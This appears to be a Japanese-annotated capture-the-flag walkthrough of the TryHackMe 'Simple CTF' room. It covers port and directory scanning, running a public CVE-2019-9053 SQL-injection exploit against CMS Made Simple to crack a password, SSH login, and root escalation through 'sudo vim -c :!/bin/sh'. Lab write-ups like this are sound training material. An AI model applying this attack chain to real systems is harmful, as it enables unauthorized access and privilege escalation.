# Simple CTF CTF

https://tryhackme.com/r/room/easyctf

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-230-252:~# TARGET=10.10.106.204
root@ip-10-10-230-252:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-28 00:38 GMT
Nmap scan report for 10.10.106.204
Host is up (0.00048s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 02:54:E3:D6:69:D3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 104.68 seconds

root@ip-10-10-230-252:~# sudo nmap -sV -p21,80,2222 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-28 00:40 GMT
Nmap scan report for 10.10.106.204
Host is up (0.00029s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:54:E3:D6:69:D3 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
```

### gobuster

```shell
$ gobuster dir -x php,txt,html -u http://$TARGET/simple -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.106.204/simple
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 299]
/index.php            (Status: 200) [Size: 19993]
/.html                (Status: 403) [Size: 300]
/modules              (Status: 301) [Size: 323] [--> http://10.10.106.204/simple/modules/]
/uploads              (Status: 301) [Size: 323] [--> http://10.10.106.204/simple/uploads/]
/doc                  (Status: 301) [Size: 319] [--> http://10.10.106.204/simple/doc/]
/admin                (Status: 301) [Size: 321] [--> http://10.10.106.204/simple/admin/]
/assets               (Status: 301) [Size: 322] [--> http://10.10.106.204/simple/assets/]
/lib                  (Status: 301) [Size: 319] [--> http://10.10.106.204/simple/lib/]
/install.php          (Status: 301) [Size: 0] [--> /simple/install.php/index.php]
/config.php           (Status: 200) [Size: 0]
/tmp                  (Status: 301) [Size: 319] [--> http://10.10.106.204/simple/tmp/]
/.php                 (Status: 403) [Size: 299]
/.html                (Status: 403) [Size: 300]
```

robots.txt
```text
User-agent: *
Disallow: /

Disallow: /openemr-5_0_1_3 
```

/simple
```text
This site is powered by CMS Made Simple version 2.2.8
```

## CVE-2019-9053

https://www.exploit-db.com/exploits/46635

```shell
$ python2 ./46635.py -u http://$TARGET/simple --crack -w /usr/share/wordlists/rockyou.txt
```
mitch / secret が判明。  
この情報で、/simple/admin でも ssh でもログインできた。

## SSH

```shell
$ ssh -p 2222 mitch@$TARGET 
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```

### 権限昇格
```shell
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

$ sudo vim -c ':!/bin/sh'

# whoami 
root

# ls /root
root.txt

# cat /root/root.txt
W3ll d0n3. You made it!
```

## 振り返り
- Python2のスクリプトを実行できる環境の作り方を学べたのが収穫
- 時間ベースSQLインジェクションをフル活用したエクスプロイトに感銘を受けた
